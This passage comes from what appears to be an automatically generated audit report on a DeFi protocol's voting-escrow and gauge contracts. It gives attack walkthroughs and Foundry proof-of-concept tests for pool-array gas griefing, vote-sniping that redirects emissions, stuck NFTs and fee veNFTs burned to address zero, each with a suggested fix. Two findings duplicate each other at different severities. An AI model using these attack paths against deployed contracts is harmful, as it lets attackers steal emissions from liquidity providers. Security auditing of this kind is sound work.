
## Impact
Meta-delegation (off-chain signature-based) is effectively unusable with common wallets/libraries; integrations relying on delegateBySig will revert, causing governance usability and tooling DoS.

## Proof of Concept
1) User signs a standard EIP-712 Delegation message using typical domain {name, chainId, verifyingContract} (no version).
2) Attacker or relayer submits the signature to VotingEscrow.delegateBySig.
3) Contract recomputes domain including an extra `version` field, producing a different digest; ecrecover fails and the call reverts. This breaks meta-delegation for all standard tools.
4) Conversely, only custom signers that mimic the contract’s non-standard domain will succeed, breaking interoperability.

## Proof of Code
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import {VotingEscrow} from "contracts/VotingEscrow.sol";

contract Delegate712MismatchTest is Test {
    VotingEscrow ve;
    address delegatee = address(0xBEEF);
    uint256 pk = 0xA11CE;
    address signer;

    function setUp() public {
        ve = new VotingEscrow(address(0xCAFE), address(0xDEAD));
        signer = vm.addr(pk);
    }

    // Demonstrates that a standard EIP-712 domain (no version) signature reverts
    function test_delegateBySig_Reverts_WithStandardDomain() public {
        bytes32 domainSpec = keccak256(
            abi.encode(
                ve.DOMAIN_TYPEHASH(),
                keccak256(bytes(ve.name())),
                block.chainid,
                address(ve)
            )
        );
        uint nonce = ve.nonces(signer);
        uint expiry = block.timestamp + 1 days;
        bytes32 structHash = keccak256(
            abi.encode(ve.DELEGATION_TYPEHASH(), delegatee, nonce, expiry)
        );
        bytes32 digestSpec = keccak256(abi.encodePacked("\x19\x01", domainSpec, structHash));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(pk, digestSpec);

        vm.expectRevert(bytes("ZA")); // ecrecover returns address(0) due to domain mismatch
        vm.prank(address(0xCAFE));
        ve.delegateBySig(delegatee, nonce, expiry, v, r, s);
    }

    // Demonstrates that only the non-standard domain (including version) works
    function test_delegateBySig_Succeeds_WithContractDomain() public {
        bytes32 domainNonStandard = keccak256(
            abi.encode(
                ve.DOMAIN_TYPEHASH(),
                keccak256(bytes(ve.name())),
                keccak256(bytes(ve.version())),
                block.chainid,
                address(ve)
            )
        );
        uint nonce = ve.nonces(signer);
        uint expiry = block.timestamp + 1 days;
        bytes32 structHash = keccak256(
            abi.encode(ve.DELEGATION_TYPEHASH(), delegatee, nonce, expiry)
        );
        bytes32 digest = keccak256(abi.encodePacked("\x19\x01", domainNonStandard, structHash));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(pk, digest);

        vm.prank(address(0xCAFE));
        ve.delegateBySig(delegatee, nonce, expiry, v, r, s);
        assertEq(ve.nonces(signer), nonce + 1);
    }
}


## Suggested Mitigation
Make the domain type and encoding consistent. Either: (A) include `string version` in DOMAIN_TYPEHASH and keep encoding it; or (B) stop encoding `version` in the domain separator. Example fix for (A):

bytes32 public constant DOMAIN_TYPEHASH = keccak256("EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)");
// keep abi.encode(... keccak256(bytes(name)), keccak256(bytes(version)), chainId, address(this))





 **Derived From** : Append-only pools array causes storage bloat and long-term gas inflation

## [L-20]. Permissionless CL gauge creation bloats pools[] without pruning, making distributeAll/distributeFees O(n) and eventually hitting block gas limit

## Derived From Pattern/Invariant
Append-only pools array causes storage bloat and long-term gas inflation

## Exploit Type
GasGriefBlockLimit

## Location
GaugeManager.distributeFees

## Minimim Privilege Required
Permissionless

## Description
GaugeManager._saveBribeData appends every created pool to pools, and there is no removal on kill or any pruning path. Killed or obsolete gauges remain represented, yet public maintenance functions iterate pools in full:

- pools grows unbounded via permissionless createGauge (notably gaugeType=1), which accepts any contract address as _pool and forces isPair = true. This allows an attacker to deploy countless dummy CL pools and create gauges for them, each pushing into pools.
- distributeFees() and distributeAll() iterate pools.length and call into each gauge. Even when gauges are killed (isAlive=false), the loop still traverses all entries.

Vulnerable snippet:

function _saveBribeData(address _pool, address _gauge, address _internal_bribe, address _external_bribe) private {
    ...
    pools.push(_pool);
    ...
}

function distributeFees() external nonReentrant {
    uint256 poolsLength = pools.length;
    for (uint256 i = 0; i < poolsLength; i++) {
        address _pool = pools[i];
        _distributeFees(_pool);
    }
}

Result: The attacker can inflate pools[], forcing distributeAll/distributeFees to become prohibitively expensive and ultimately inoperable due to block gas limits.

## Impact
Append-only pools[] grows without pruning and accepts arbitrary CL pool addresses (for gaugeType=1) as long as tokens are whitelisted and at least one is a connector. Attackers can create many dummy pools/gauges that are pushed into pools[]. distributeAll() and distributeFees() iterate the entire pools array, so their cost scales O(n) and will eventually exceed block gas for those full-scan variants. However, the contract also exposes chunked distribution functions (distribute(start,finish) and distributeFees(start,finish)), so protocol operations remain feasible when properly paginated. Practical impact: gas grief and potential inoperability of the convenience full-scan functions; not a direct loss of funds.

## Proof of Concept
Preconditions: TokenHandler has whitelisted popular tokens (e.g., USDC, WETH) and marks at least one as a connector.

1) Attacker deploys many minimal contracts that mimic a CL pool surface: token0(), token1(), setGaugeAndPositionManager(). token0 returns a whitelisted token, token1 returns another whitelisted token; at least one must be a connector.
2) For each fake pool contract, attacker calls GaugeManager.createGauge(fakePool, 1). For gaugeType=1 the code sets isPair = true and does not verify the pool against the configured CL factory, so each call succeeds and _saveBribeData() pushes _pool into pools[].
3) pools[] size grows unbounded. Even after governance calls killGauge() on some gauges, entries are never removed from pools[].
4) Any call to distributeAll() or distributeFees() walks the entire pools[] and attempts to process each entry, turning these calls O(n). With enough fabricated entries, these full-scan functions become too gas-expensive and revert, while range-based endpoints still work.

## Proof of Code
pragma solidity 0.8.13;

import "forge-std/Test.sol";
import {GaugeManager} from "contracts/GaugeManager.sol";

contract PoolsBloatTest is Test {
    GaugeManager gm;

    MockPermissionsRegistry pr;
    MockTokenHandler th;
    MockVE ve;
    MockERC20 base;
    MockGaugeFactoryCL gfcl;
    MockBribeFactory bf;

    function setUp() public {
        base = new MockERC20();
        ve = new MockVE(address(base));
        th = new MockTokenHandler();
        gfcl = new MockGaugeFactoryCL();
        pr = new MockPermissionsRegistry();
        bf = new MockBribeFactory();

        gm = new GaugeManager();
        gm.initialize(
            address(ve),                // __ve
            address(th),                // tokenHandler
            address(0x1111),            // v2 gaugeFactory (unused)
            address(gfcl),              // CL gaugeFactory
            address(0x2222),            // v2 pairFactory (unused)
            address(0x3333),            // CL pairFactory (only checked nonzero)
            address(pr),                // permissionRegistry
            address(0xBEEF)             // nfpm
        );

        // Point to a bribe factory (roles always pass in mock)
        gm.setBribeFactory(address(bf));
    }

    function _makePool() internal returns (MockCLPool p) {
        // Return a fake pool with whitelisted/connector tokens per mocks
        p = new MockCLPool(address(0xAAA1), address(0xBBB2));
    }

    function test_unboundedPools_and_fullScanIteration() public {
        // Create 3 gauges (grows pools[])
        for (uint i = 0; i < 3; i++) {
            MockCLPool p = _makePool();
            (address g,,) = gm.createGauge(address(p), 1); // gaugeType=1
            // MockGauge increments on claimFees; store address
            assertTrue(g != address(0));
        }
        assertEq(gfcl.length(), 3);

        // Call full-scan distributeFees(): should call claimFees() on each gauge
        gm.distributeFees();
        for (uint i = 0; i < gfcl.length(); i++) {
            MockGauge g = MockGauge(gfcl.gauges(i));
            assertEq(g.claimCalls(), 1, "each gauge should be touched once");
        }

        // Kill first gauge: entry remains in pools[], but killed gauge won't be processed
        address g0 = gfcl.gauges(0);
        gm.killGauge(g0);

        // Call again; alive gauges should increment; killed stays unchanged
        gm.distributeFees();
        assertEq(MockGauge(gfcl.gauges(0)).claimCalls(), 1, "killed gauge not processed");
        assertEq(MockGauge(gfcl.gauges(1)).claimCalls(), 2, "alive gauge processed again");
        assertEq(MockGauge(gfcl.gauges(2)).claimCalls(), 2, "alive gauge processed again");

        // Verify pools length did not shrink after kill
        // Note: GaugeManager.pools is public; check via low-level call
        (bool ok, bytes memory data) = address(gm).staticcall(abi.encodeWithSignature("pools(uint256)", 0));
        require(ok && data.length > 0, "pools[0] readable");
    }
}

// ---------------- Mocks ----------------
contract MockERC20 { function approve(address, uint) external pure returns (bool) { return true; } }

contract MockVE { address public tokenAddr; constructor(address t){ tokenAddr=t; } function token() external view returns(address){ return tokenAddr; } }

contract MockPermissionsRegistry { function emergencyCouncil() external pure returns (address){return address(0xEC);} function hybraTeamMultisig() external pure returns(address){return address(0xABCD);} function hasRole(bytes memory, address) external pure returns (bool){ return true; } }

contract MockTokenHandler { function isWhitelisted(address) external pure returns (bool){ return true; } function isConnector(address) external pure returns (bool){ return true; } }

contract MockGauge {
    uint256 private _calls;
    function claimFees() external returns (uint256, uint256) { _calls++; return (0,0); }
    function emergency() external pure returns (bool) { return false; }
    function claimCalls() external view returns (uint256) { return _calls; }
}

contract MockGaugeFactoryCL {
    address[] internal _gauges;
    function createGauge(
        address, address, address, address, address, address, bool, address
    ) external returns (address) {
        MockGauge g = new MockGauge();
        _gauges.push(address(g));
        return address(g);
    }
    function gauges(uint i) external view returns (address) { return _gauges[i]; }
    function length() external view returns (uint) { return _gauges.length; }
}

contract MockBribeFactory { function createBribe(address, address, address, string memory) external view returns (address) { return address(this); } }

contract MockCLPool {
    address private _t0; address private _t1;
    constructor(address t0, address t1){ _t0=t0; _t1=t1; }
    function token0() external view returns (address){ return _t0; }
    function token1() external view returns (address){ return _t1; }
    function setGaugeAndPositionManager(address, address) external { }
}

## Suggested Mitigation
Fully address both the root cause (fake CL pools) and the bloat:

1) Validate CL pools on creation for gaugeType=1:
   - require(ICLFactory(_factoriesData.pairFactories[1]).isPool(_pool)) == true; 
   - Optionally also check that the pool’s token0/token1 match TokenHandler whitelist to avoid spoofing, and that the NFPM address matches.

2) Track active pools in a removable set:
   - Maintain mapping(address pool => uint index) and an array, or use an EnumerableSet of active pools.
   - On killGauge or when a pool/gauge is decommissioned, swap-and-pop remove from pools and update the index mapping to keep O(1) deletion.

3) Prefer pagination-only entrypoints:
   - Deprecate distributeAll() and the full-scan distributeFees() to avoid accidental O(n) calls at scale. Keep only distribute(start, finish) variants and/or accept an array of gauges to process.

4) Defensive extras:
   - Reject duplicate pool insertions.
   - Consider a governance-controlled cap or rate limit on permissionless CL gauge creation if needed.
   - Emit events on removal for off-chain indexers to stay consistent.





 **Derived From** : Epoch share uses live weights enabling last-minute vote sniping of emissions

## [H-21]. Emissions can be redirected by vote-sniping: GaugeManager uses live weights at distribution time instead of epoch snapshot

## Derived From Pattern/Invariant
Epoch share uses live weights enabling last-minute vote sniping of emissions

## Exploit Type
FlashLoanEconomicManipulation

## Location
GaugeManager._updateForAfterDistribution / _distribute

## Minimim Privilege Required
Permissionless

## Description
GaugeManager calculates each gauge’s claimable emissions using the current (mutable) voter weight at distribution time, not an immutable per-epoch snapshot. In _updateForAfterDistribution(), it reads live weight via IVoter(voter).weights(_pool) and computes the share against the global index delta:

- _supplied = IVoter(voter).weights(_pool);
- _delta = _index - _supplyIndex;
- _share = _supplied * _delta / 1e18;

Distribution is permissionless (distribute/distributeAll) and feeds into _distribute(), which calls _updateForAfterDistribution() just before sending rewards to the gauge:

function _distribute(address _gauge) internal {
  if (lastTimestamp < HybraTimeLibrary.epochStart(block.timestamp)) {
    _updateForAfterDistribution(_gauge);
    uint256 _claimable = claimable[_gauge];
    ... IGauge(_gauge).notifyRewardAmount(...)
  }
}

An attacker with ve voting power can (1) let Minter add emissions (index increments using totalWeight at notify), then (2) change votes right before calling distribute() for a target gauge they control LP in, making _supplied reflect the attacker’s new weight. This lets them capture a disproportionate or even full share of the just-minted emissions (vote sniping), depriving originally weighted gauges. The total emission is conserved, but allocation fairness is broken and can be fully redirected by intra-tx weight changes.

## Impact
A ve voter can unilaterally redirect a large or full portion of the weekly HYBR emissions to a chosen gauge by changing votes immediately before distribution and calling distribute([theirGauge]) first. Because GaugeManager computes each gauge’s share using live weights at distribution time (not a per-epoch snapshot), the attacker’s gauge accrues the entire index delta, while other gauges in the same epoch accrue zero when distributed later. This results in material loss of emissions for honest LPs in other gauges and unjust enrichment of the attacker’s gauge. Impact is real-value asset loss across epochs.

## Proof of Concept
High-level PoC (covers actual timing):

1) Setup: Two pools A and B have gauges. Initially all weight is on A; B has 0.
2) Attacker re-allocates ve votes to put 100% weight on B (their target).
3) Attacker calls GaugeManager.distribute([gaugeB]). Note: distribute() internally calls IMinter(minter).update_period() first, which mints and notifies the new epoch’s emissions to GaugeManager (index increases using totalWeight at that moment). Then _distribute(gaugeB) runs and _updateForAfterDistribution(gaugeB) reads live weight for B (now all votes) and accrues claimable_B ≈ full emission for the epoch.
4) Later distribution calls for gaugeA in the same epoch compute with live weight for A (now 0) and accrue ~0, since supplyIndex is updated per gauge at its first distribution call and the index delta is already consumed.
5) Result: The epoch’s emissions are redirected to gauge B under the attacker’s control.

This also works if the minter notified emissions earlier in a separate transaction: the attacker flips votes immediately before calling distribute([gaugeB]), achieving the same outcome.

## Proof of Code
pragma solidity 0.8.13;

import "forge-std/Test.sol";
import {GaugeManager} from "../contracts/GaugeManager.sol";
import {IERC20Upgradeable} from "@openzeppelin/contracts-upgradeable/token/ERC20/IERC20Upgradeable.sol";

// Minimal ERC20 for testing
contract MockERC20 is IERC20Upgradeable {
    string public name = "BASE";
    string public symbol = "BASE";
    uint8 public decimals = 18;
    uint256 public override totalSupply;
    mapping(address => uint256) public override balanceOf;
    mapping(address => mapping(address => uint256)) public override allowance;
    function transfer(address to, uint256 amount) external override returns (bool){ require(balanceOf[msg.sender] >= amount, "bal"); balanceOf[msg.sender]-=amount; balanceOf[to]+=amount; return true; }
    function approve(address spender, uint256 amount) external override returns (bool){ allowance[msg.sender][spender]=amount; return true; }
    function transferFrom(address from, address to, uint256 amount) external override returns (bool){ require(balanceOf[from] >= amount, "bal"); require(allowance[from][msg.sender] >= amount, "allow"); allowance[from][msg.sender]-=amount; balanceOf[from]-=amount; balanceOf[to]+=amount; return true; }
    function mint(address to, uint256 amount) external { balanceOf[to]+=amount; totalSupply+=amount; }
}

// Mock VotingEscrow that returns base token
contract MockVotingEscrow {
    address public _token;
    constructor(address t){ _token = t; }
    function token() external view returns (address){ return _token; }
}

// Perm registry: allow all roles
contract MockPermissionsRegistry {
    function emergencyCouncil() external view returns(address){ return address(0xEE); }
    function hybraTeamMultisig() external view returns(address){ return address(0xAA); }
    function hasRole(bytes memory, address) external pure returns(bool){ return true; }
}

// TokenHandler: whitelist everything
contract MockTokenHandler {
    function isWhitelisted(address) external pure returns (bool){ return true; }
    function isConnector(address) external pure returns (bool){ return true; }
}

// CL pool mock: exposes token0/1 and accept setGaugeAndPositionManager
contract MockCLPool {
    address public t0; address public t1;
    constructor(address a, address b){ t0=a; t1=b; }
    function token0() external view returns(address){ return t0; }
    function token1() external view returns(address){ return t1; }
    function setGaugeAndPositionManager(address, address) external { }
}

// Voter mock with live weights
contract MockVoter {
    mapping(address => uint256) public weights; // pool => weight
    uint256 public total;
    function setWeight(address pool, uint256 w) external { total = total - weights[pool] + w; weights[pool] = w; }
    function totalWeight() external view returns (uint256){ return total; }
}

// Bribe factory mock
contract MockBribeFactory {
    function createBribe(address, address, address, string memory) external returns (address){ return address(new Empty()); }
}
contract Empty { }

// Gauge mock: records notified reward
contract MockGauge {
    mapping(address => uint256) public notified;
    function notifyRewardAmount(address token, uint256 amount) external { notified[token] += amount; }
    function emergency() external pure returns (bool){ return false; }
}

// Gauge factory (CL) mock
contract MockGaugeFactoryCL {
    function createGauge(
        address, address, address, address, address, address, bool, address
    ) external returns (address){ return address(new MockGauge()); }
}

// Pair factory mock (unused in CL path)
contract MockPairFactory { function isPair(address) external pure returns (bool){ return true; } }

// Minter mock that can call manager.notifyRewardAmount and supports update_period()
contract MockMinter {
    function update_period() external pure returns (uint256){ return 0; }
    function fundAndNotify(GaugeManager gm, IERC20Upgradeable base, uint256 amount) external {
        base.approve(address(gm), amount);
        gm.notifyRewardAmount(amount);
    }
}

contract GaugeManagerVoteSnipingTest is Test {
    GaugeManager gm;
    MockERC20 base;
    MockVotingEscrow ve;
    MockPermissionsRegistry perms;
    MockTokenHandler handler;
    MockGaugeFactoryCL gfcl;
    MockPairFactory pf;
    MockBribeFactory bribes;
    MockVoter voter;
    MockMinter minter;

    address poolA;
    address poolB;
    address gaugeA;
    address gaugeB;

    function setUp() external {
        base = new MockERC20();
        ve = new MockVotingEscrow(address(base));
        perms = new MockPermissionsRegistry();
        handler = new MockTokenHandler();
        gfcl = new MockGaugeFactoryCL();
        pf = new MockPairFactory();
        bribes = new MockBribeFactory();
        voter = new MockVoter();
        minter = new MockMinter();

        gm = new GaugeManager();
        gm.initialize(address(ve), address(handler), address(0xDEAD), address(gfcl), address(pf), address(0xBEEF), address(perms), address(0x9999));
        gm.setBribeFactory(address(bribes));
        gm.setVoter(address(voter));
        gm.setMinter(address(minter));

        // create two CL pools
        MockCLPool pA = new MockCLPool(address(0xA1), address(0xA2));
        MockCLPool pB = new MockCLPool(address(0xB1), address(0xB2));
        poolA = address(pA);
        poolB = address(pB);

        // create gauges (gaugeType = 1 for CL)
        (address gA,,) = gm.createGauge(poolA, 1);
        (address gB,,) = gm.createGauge(poolB, 1);
        gaugeA = gA; gaugeB = gB;

        // initial weights: all on A
        voter.setWeight(poolA, 100); // total=100
        voter.setWeight(poolB, 0);

        // fund minter and notify emissions
        base.mint(address(minter), 1_000e18);
        vm.prank(address(minter));
        minter.fundAndNotify(gm, base, 100e18); // index += 100e18 * 1e18 / 100
    }

    function test_voteSnipingRedirectsEmissions() external {
        // attacker flips weight to B before distribution
        voter.setWeight(poolA, 0);
        voter.setWeight(poolB, 100); // total stays 100

        // Distribute only to B first (permissionless)
        address[] memory arr = new address[](1);
        arr[0] = gaugeB;
        gm.distribute(arr);

        // Verify emissions were redirected to B
        uint256 notifiedB = MockGauge(gaugeB).notified(address(base));
        uint256 notifiedA = MockGauge(gaugeA).notified(address(base));
        assertEq(notifiedB, 100e18, "B should capture full epoch emission");
        assertEq(notifiedA, 0, "A receives nothing due to sniping");
    }
}

## Suggested Mitigation
Do not use live weights at distribution. Snapshot immutable per-epoch weights and the total at epoch rollover (or at the moment emissions are notified) and accrue using those snapshots for the entire epoch.

Concretely:
- On epoch rollover or when minter notifies new emissions, read Voter weights for each pool and store:
  - weightsPerEpoch[epochStart][pool]
  - totalWeightPerEpoch[epochStart]
  - freeze vote changes to apply only to the next epoch.
- In _updateForAfterDistribution(), replace IVoter(voter).weights(_pool) with weightsPerEpoch[currentEpochStart][_pool]; compute share as snapshotWeight * (indexDelta) / 1e18 where indexDelta was derived using totalWeightPerEpoch[currentEpochStart].
- Alternatively, have Voter expose weightsAt(pool, epochStart) and totalWeightAt(epochStart) via checkpoints and query those from GaugeManager.

This ensures all gauges’ shares for a given epoch are computed against the same immutable snapshot, eliminating last-minute vote sniping and order dependence.


## [M-22]. Live weight reads in GaugeManager._updateForAfterDistribution allow same-tx vote sniping to redirect weekly emissions

## Derived From Pattern/Invariant
Epoch share uses live weights enabling last-minute vote sniping of emissions

## Exploit Type
FlashLoanEconomicManipulation

## Location
GaugeManager._updateForAfterDistribution

## Minimim Privilege Required
Permissionless

## Description
GaugeManager computes gauge claimables using live voter pool weights at distribution time rather than an epoch snapshot. In _updateForAfterDistribution it reads: `uint256 _supplied = IVoter(voter).weights(_pool);` and multiplies by the global `index` delta (set earlier in notifyRewardAmount using the then-current totalWeight). Because distribute() is permissionless and `_updateForAfterDistribution()` is called right before notifying the gauge, a voter can atomically adjust votes (via Voter.vote/poke) and then call distribute() in the same transaction. This redirects the just-minted weekly emissions to the newly favored gauge, regardless of the weight at the time of emission accounting. Vulnerable snippets:
- _updateForAfterDistribution():
  `uint256 _supplied = IVoter(voter).weights(_pool);`
  `uint256 _share = _supplied * _delta / 1e18;`
- _distribute():
  `if (lastTimestamp < HybraTimeLibrary.epochStart(block.timestamp)) { _updateForAfterDistribution(_gauge); ... IGauge(_gauge).notifyRewardAmount(...) }`

## Impact
A voter can atomically change votes and trigger distribution so their chosen gauge captures a disproportionate (up to 100%) share of the weekly emissions, diluting other gauges and breaking per-epoch proportionality. This can be repeated every epoch.

## Proof of Concept
1) Minter calls GaugeManager.notifyRewardAmount(amount), updating global `index` using totalWeight at that moment.
2) Right before distribution, attacker (any ve voter) switches all votes to target pool.
3) Attacker calls distribute(gauge) in the same tx. `_updateForAfterDistribution()` uses the new (sniped) weight, allocating the just-minted emissions to the target gauge.
4) Result: the gauge receives emissions based on the sniped weight rather than the weight at emission time, allowing redirection of rewards.
Note: This works atomically because distribute() is permissionless and _updateForAfterDistribution() reads live IVoter weights.

## Proof of Code
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "contracts/GaugeManager.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract MockERC20 is ERC20 {
    constructor() ERC20("BASE", "BASE") {}
    function mint(address to, uint256 amount) external { _mint(to, amount); }
}

contract FakeVE {
    address public _token;
    constructor(address token_) { _token = token_; }
    function token() external view returns (address) { return _token; }
}

contract FakeVoter {
    mapping(address => uint256) public w;
    uint256 public tot;
    function setWeight(address pool, uint256 val) external { w[pool] = val; }
    function setTotal(uint256 val) external { tot = val; }
    function weights(address pool) external view returns (uint256) { return w[pool]; }
    function totalWeight() external view returns (uint256) { return tot; }
}

contract MockGauge {
    address public lastToken;
    uint256 public lastAmount;
    function notifyRewardAmount(address token, uint256 amount) external {
        lastToken = token;
        lastAmount += amount;
    }
    function emergency() external pure returns (bool) { return false; }
}

contract MockPermissionsRegistry is IPermissionsRegistry {
    function emergencyCouncil() external pure returns (address) { return address(0); }
    function hybraTeamMultisig() external pure returns (address) { return address(0); }
    function hasRole(bytes memory, address) external pure returns (bool) { return true; }
}

contract MinterEOA { /* placeholder to satisfy code length checks */ }

contract GMHarness is GaugeManager {
    function exposeDistribute(address g) external { _distribute(g); }
    function configureGauge(address g, address pool, bool alive, bool isCL) external {
        poolForGauge[g] = pool;
        isGauge[g] = true;
        isAlive[g] = alive;
        isCLGauge[g] = isCL;
    }
}

contract VoteSnipingTest is Test {
    uint256 constant WEEK = 1800; // per HybraTimeLibrary

    MockERC20 base;
    FakeVE ve;
    GMHarness gm;
    MockPermissionsRegistry pr;
    FakeVoter voter;
    MockGauge gauge;
    address pool;
    address minter;

    function setUp() public {
        base = new MockERC20();
        ve = new FakeVE(address(base));
        pr = new MockPermissionsRegistry();

        gm = new GMHarness();
        // initialize: (__ve, tokenHandler, gaugeFactory, gaugeFactoryCL, pairFactory, pairFactoryCL, permissionRegistry, nfpm)
        gm.initialize(address(ve), address(0xBEEF), address(0xCAFE), address(0xD00D), address(0xFEED), address(0xF00D), address(pr), address(0xDEAD));

        voter = new FakeVoter();
        // GAUGE_ADMIN bypassed by MockPermissionsRegistry.hasRole => true
        gm.setVoter(address(voter));

        minter = address(new MinterEOA());
        gm.setMinter(minter);

        gauge = new MockGauge();
        pool = address(0x1111);
        gm.configureGauge(address(gauge), pool, true, false);

        // Set initial voter state: total weight 100, pool weight 0
        voter.setTotal(100);
        voter.setWeight(pool, 0);
    }

    function testVoteSnipingRedirectsEmissions() public {
        uint256 amt = 1e18;
        // Fund minter and approve GaugeManager to pull base
        base.mint(minter, amt);
        vm.prank(minter);
        base.approve(address(gm), type(uint256).max);

        // Minter updates global index for the epoch
        vm.prank(minter);
        gm.notifyRewardAmount(amt);

        // Move to a new epoch boundary so _distribute gate passes
        vm.warp(WEEK + 1);

        // Attacker snipes votes to target pool right before distribution
        voter.setWeight(pool, 100);

        // In the same tx, trigger distribution. Live weights are used here
        gm.exposeDistribute(address(gauge));

        // Because totalWeight was 100 and pool weight was set to 100 at distribution,
        // the gauge captures the entire emission despite having 0 weight at emission time.
        assertEq(gauge.lastAmount(), amt, "sniped gauge should capture full emission");
    }
}


## Suggested Mitigation
Snapshot per-epoch weights and use the snapshot during distribution. Concretely: when Minter triggers weekly emissions (index update), record totalWeight and each pool's weight into a snapshot mapping keyed by epochStart (e.g., weightsPerEpoch[epoch][pool], totalWeightPerEpoch[epoch]). Then, in _updateForAfterDistribution(), replace the live read `IVoter(voter).weights(_pool)` with the snapshotted `weightsPerEpoch[currentEpoch][_pool]`, and compute shares using the snapshotted totalWeight. Alternatively, allocate emissions directly at notify time by looping gauges (or by pushing per-pool deltas) to avoid dependence on mutable state between notify and distribute. Enforce vote cutoff windows so votes cannot change within the same transaction as distribution.





 **Derived From** : Direct NFT transfers to GaugeCL get stuck (unconditional ERC721Receiver acceptance)

## [L-23]. GaugeCL.onERC721Received unconditionally accepts NFTs; direct safeTransferFrom bricks position and withdraw() reverts

## Derived From Pattern/Invariant
Direct NFT transfers to GaugeCL get stuck (unconditional ERC721Receiver acceptance)

## Exploit Type
StandardViolation

## Location
GaugeCL.onERC721Received

## Minimim Privilege Required
Permissionless

## Description
GaugeCL implements IERC721Receiver and returns the magic value unconditionally: onERC721Received(...) { return IERC721Receiver.onERC721Received.selector; }. No state is updated in this hook. The gauge tracks ownership only via deposit(), which writes _stakes[msg.sender].add(tokenId). withdraw() enforces require(_stakes[msg.sender].contains(tokenId), "NA"); so any NFT sent directly via safeTransferFrom is accepted but never recorded, making it unrecoverable. There is no admin rescue path. Vulnerable snippets:
- function onERC721Received(...) external pure override returns (bytes4) { return IERC721Receiver.onERC721Received.selector; }
- function withdraw(...) { require(_stakes[msg.sender].contains(tokenId), "NA"); ... }

## Impact
Users who mistakenly safeTransferFrom their position NFT (or any ERC721) directly to GaugeCL will brick the token because the gauge unconditionally accepts NFTs but never records the stake. The user cannot recover via withdraw() (reverts with "NA"), and there is no rescue path. No third-party can steal funds; impact is limited to misdirected user transfers and integrations that incorrectly transfer NFTs to the gauge.

## Proof of Concept
Steps to reproduce
1) User owns a position NFT (e.g., Uniswap V3 NFPM tokenId).
2) They call safeTransferFrom(user, address(GaugeCL), tokenId) directly instead of deposit().
3) GaugeCL.onERC721Received returns the magic value and accepts the NFT but does not update _stakes.
4) User calls withdraw(tokenId, redeemType) and it reverts with "NA" because _stakes[msg.sender] does not contain tokenId. There is no rescue function, so the NFT is stuck.

## Proof of Code
pragma solidity 0.8.13;

import "forge-std/Test.sol";
import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import {GaugeCL} from "contracts/CLGauge/GaugeCL.sol";

contract MockERC721 {
    mapping(uint256 => address) private _owner;
    mapping(uint256 => address) private _approval;

    function mint(uint256 id) external {
        require(_owner[id] == address(0), "minted");
        _owner[id] = msg.sender;
    }

    function ownerOf(uint256 id) external view returns (address) {
        return _owner[id];
    }

    function approve(address to, uint256 id) external {
        require(msg.sender == _owner[id], "NA");
        _approval[id] = to;
    }

    function safeTransferFrom(address from, address to, uint256 id) external {
        require(msg.sender == _owner[id] || msg.sender == _approval[id], "NA");
        require(from == _owner[id], "from");
        _owner[id] = to;
        bytes4 retval = IERC721Receiver(to).onERC721Received(msg.sender, from, id, "");
        require(retval == IERC721Receiver.onERC721Received.selector, "receiver");
    }
}

contract GaugeCL_StuckNFT_Test is Test {
    GaugeCL gauge;
    MockERC721 nft;
    address user = address(0xBEEF);

    function setUp() external {
        // pass dummy addresses; we won't reach NFPM calls due to early require
        gauge = new GaugeCL(address(0), address(0), address(0), address(0), address(0), address(0), address(0), false, address(0), address(0));
        nft = new MockERC721();
    }

    function test_DirectSafeTransfer_bricksNFT() external {
        vm.startPrank(user);
        nft.mint(1);
        // Directly send NFT to gauge; onERC721Received accepts unconditionally
        nft.safeTransferFrom(user, address(gauge), 1);
        // Gauge now holds the NFT
        assertEq(nft.ownerOf(1), address(gauge));
        // Withdraw reverts because _stakes was never populated via deposit()
        vm.expectRevert(bytes("NA"));
        gauge.withdraw(1, 0);
        vm.stopPrank();
    }
}


## Suggested Mitigation
Harden onERC721Received to only accept transfers initiated by the intended deposit flow. In onERC721Received, require both: (1) operator == address(this) (the gauge called safeTransferFrom during deposit) and (2) msg.sender == address(nonfungiblePositionManager) (the NFT contract is the NFPM). For any other source/operator, revert with an explicit message (e.g., "use deposit()"). This prevents accidental direct transfers from being accepted and trapped. Optionally, add an owner-only or emergency-only ERC721 rescue function that can transfer out NFTs not tracked in _stakes; restrict it to NFTs that are not currently staked/recorded and, if feasible, only when emergency mode is active to reduce centralization risk.





 **Derived From** : Fee veNFT can be sent to zero address if Team not set, permanently burning fees

## [M-24]. GrowthHYBR.withdraw sends fee veNFT to address(0) when Team unset, burning protocol fees

## Derived From Pattern/Invariant
Fee veNFT can be sent to zero address if Team not set, permanently burning fees

## Exploit Type
UpgradeabilityInitializerSafety

## Location
GrowthHYBR.withdraw

## Minimim Privilege Required
Permissionless

## Description
GrowthHYBR.withdraw multi-splits the vault veNFT into [remaining, user, fee] parts and transfers the fee veNFT to Team without validating Team != address(0). Since Team defaults to zero and VotingEscrow.safeTransferFrom does not forbid zero-address recipients, the fee veNFT can be transferred to address(0) and becomes irrecoverable while still holding locked HYBR value (permanent loss of protocol fees).

Vulnerable snippet:

// After multiSplit
veTokenId = newTokenIds[0];
userTokenId = newTokenIds[1];
uint256 feeTokenId = newTokenIds[2];
IVotingEscrow(votingEscrow).safeTransferFrom(address(this), msg.sender, userTokenId);
IVotingEscrow(votingEscrow).safeTransferFrom(address(this), Team, feeTokenId); // Team can be zero

VotingEscrow._transferFrom(...) lacks a check that _to != address(0), so ownership is set to the zero address.

## Impact
If Team is not set (defaults to address(0)), each withdraw that charges a fee mints a fee veNFT and transfers it to address(0). Because VotingEscrow allows transfer to the zero address and no one can operate that address, the fee veNFT (with locked HYBR) becomes permanently stuck. This destroys protocol revenue for every withdrawal executed before Team is configured. User principal is unaffected, but protocol fee income is lost and unrecoverable.

## Proof of Concept
1) Deploy HYBR, VotingEscrow, and GrowthHYBR without setting Team.
2) Enable veNFT splitting so GrowthHYBR.withdraw can call multiSplit: VotingEscrow.toggleSplit(address(0), true).
3) Attacker deposits HYBR into GrowthHYBR (vault creates a veNFT and locks HYBR).
4) Advance time into the allowed withdraw window (epochStart + head_not_withdraw_time < now < epochNext - tail_not_withdraw_time).
